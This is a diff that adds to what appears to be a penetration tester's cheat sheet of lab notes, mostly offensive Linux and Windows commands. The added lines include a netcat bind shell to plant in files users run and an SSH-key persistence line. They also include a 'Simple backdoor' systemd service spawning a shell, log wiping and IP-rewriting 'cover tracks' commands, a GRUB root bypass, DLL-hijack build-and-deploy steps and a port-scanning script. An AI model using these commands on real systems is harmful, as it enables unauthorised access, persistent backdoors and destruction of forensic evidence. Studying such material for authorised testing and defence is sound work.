@@ -12,6 +12,8 @@ http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-she
 shell-storm.org
 https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels
 https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/
+https://captmeelo.com/exploitdev/osceprep/2018/06/27/vulnserver-trun.html
+http://10.50.25.12/uploads/
 
 /////////HTTP reponse codes////////
 10X == Informational
@@ -133,6 +135,7 @@ journalctl -u ssh 		(can append SYSLOG_FACILITY=authpriv)
 chkconfig
 |tee		#send to a file and to stdout
 lsof  -p <prosessid>
+cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
 
 //SSH Multiplexing (AKA control sockets)
 ssh -M -S /tmp/s root@10.50.20.220 -NTf				#creates the master
@@ -149,14 +152,129 @@ ipconfig /all
 
 ///////// Linux Priv Esc \\\\\\\\\ 
 sudo -l				#what can i do?
-/usr/bin/apt-get		#allows you to use "GTFO BINS"
+/usr/bin/apt-get		#allows you to use "*******GTFOBINS.com*********"
+/bin/cat /var/log/syslog*	#allows you to add another file to look at by appending a space and file to the end
 
-find / -type f -perm /4000 2>/dev/nul
-/usr/bin/find			#not normal
+sudo -s				#may give root privs
+
+find / -type f -perm /4000 -ls 2>/dev/nul	# -ls is optional
+/usr/bin/find			#not normal to be SUID
 
 find /etc/cron*
 cat /etc/crontab	-or-	/etc/cron.d
 find /etc/cron* -writable
+
+ls -l /sbin/init
+systemctl
+
+----------------------
+//Physical Access, Gaining Root Access
+up and down arrow to interrupt
+hit E at the grub menu
+add to linux item:
+	init=/bin/bash
+mount -o remount,rw /
+----------------------
+
+/etc/crontab	-or-	/etc/cron.d
+
+------------------------------
+//Put this in a file that a user will run
+nc -lp 4444 -e /bin/bash
+-or-
+echo "pub_sshkey" >> $HOME/.ssh/authorized_keys
+------------------------------
+
+#Look into reptile rootkit
+
+--------------------------
+#Simple backdoor
+cp /lib/systemd/system/cron.service evil.service
+add to execStart item:
+	/bin/nc -lp 4444 -e /bin/bash
+systemcrl enable evil
+systemcrl start evil
+--------------------------
+
+////// Cover tracks in Linux \\\\\\\ 
+journalctl
+/etc/rsyslog.conf
+/etc/rsyslog.d
+
+#Just get rid of it
+	rm -rf (/path/file)
+#Blank it
+	cat /dev/null > (/path/file)
+	echo > /var/log/btmp
+
+#Replacing my IP in the log to divert attention
+sed -Ei 's/192\.168\.248\.153/10\.10\.10\.10/g' auth.log
+
+touch -c -t 201603051015 1.txt
+touch -r 3.txt 1.txt
+
+//////////////////// Windows PRIV ESC \\\\\\\\\\\\\\\\\\ 
+//Finding Vulnerabilities
+schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6 | more
+wmic service list full
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System		#checking UAC settings
+
+icacls c:\users\<username>
+
+-----------------------------
+//Malicious dll
+#Within Procmon
+filter --> add the following:
+Path contains .dll
+Result is NAME NOT FOUND
+Process Name is <name of process>
+
+run process
+
+#select a dll that we can write to
+
+#(on linux)
+nano <name of dll>.c
+i686-w64-mingw32-g++ -c -D <name of dll>.dll bad.c && i686-w64-mingw32-g++ -shared -o <name of dll>.dll <name of dll>.o -Wl,--out-implib,<name of dll>.a
+base64 <name of dll>.dll | xclip -selection clipboard
+
+#(on windows)
+paste output to a txt and save
+certutil -decode <name of dll>.txt <name of dll>.dll		#decodes and save it
+put dll in location it is looking for it
+run process
+------------------------------
+------------------------------
+//Vuln Services
+(windows cmd)
+for /f "tokens=2 delims='='" %a in ('wmic service get PathName /FORMAT:LIST ^|findstr /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+
+reg query HKLM\SYSTEM\CurrentControlSet\Services\ /s /v ImagePath | Select-String -Pattern "ImagePath" -CaseSensitive | Select-String -Pattern "system32" -NotMatch
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"
+------------------------------
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\``
+
+winlogonautologon ?
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Current Version\Winlogon
+
+auditpol /get /category:*
+auditpol /get /category:* | findstr /i "success failure"
+4624/4625 successful/failed login
+4720 account created
+4672 administrator equivalent user logs on
+7045 Service creation
+
+wevtutil el
+wmic ntevent where "logfile="<LOGNAME>" list full
+Get-Eventlog -List
+
+doskey /history
+
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
 
 ==================================================================================================
 python -m SimpleHTTPServer		#python simple http server
@@ -182,3 +300,20 @@ ssh -D 127.0.0.1:9050 user@ip -CNTX #dynamic pivot for proxychains
 ssh-keygen -t rsa 							#creates ~/.ssh id_rsa id_rsa.pub
 ssh-copy-id -i ~/.ssh/id_rsa.pub user@host 				#adds id_rsa.pub to remote user ~/.ssh/authorized_keys
 ssh -J user@pivot:port user@internalhost:port 				#tunnel straight to internal hosts thru pivot
+
+-----------------------------
+//Scan Script
+#!/bin/bash
+
+#sudo arping -c 2 192.168.65.30 | grep "index" | sort -u | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
+
+arr=($(for i in {97..130}; do ping -c1 192.168.28.$i | grep "icmp_seq=1" | grep -v "Unreachable" | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'& done))
+
+for i in "${arr[@]}" 
+	 do
+         for x in {1..5000} 
+	 do
+         nc -nvzw1 $i $x 2>&1 &
+         done | grep -E "open|succ"
+done
+-----------------------------
